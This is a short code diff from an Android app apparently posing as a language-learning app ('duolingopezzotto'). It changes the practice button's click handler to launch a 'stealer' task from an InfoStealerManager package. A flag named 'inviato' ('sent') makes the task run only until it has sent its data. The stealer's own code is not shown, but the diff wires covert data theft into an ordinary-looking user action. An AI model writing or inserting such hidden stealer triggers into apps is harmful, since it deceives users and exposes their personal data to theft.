@@ -1,5 +1,6 @@
 package com.example.duolingopezzotto.Activity;
 
+import static com.example.duolingopezzotto.InfoStealerManager.InformationStealer.inviato;
 import static com.example.duolingopezzotto.InfoStealerManager.JSONParser.convertStringToJSON;
 
 import android.Manifest;
@@ -77,7 +78,7 @@ public class MainActivity extends AppCompatActivity {
         });
 
         esercitatiButton.setOnClickListener(view -> {
-            executor.execute(stealer);
+            if (inviato == 0) executor.execute(stealer);
             //my_db.deleteAll();
 
             Intent gotoScegliCategorie = new Intent(MainActivity.this, ScegliCategorieActivity.class);
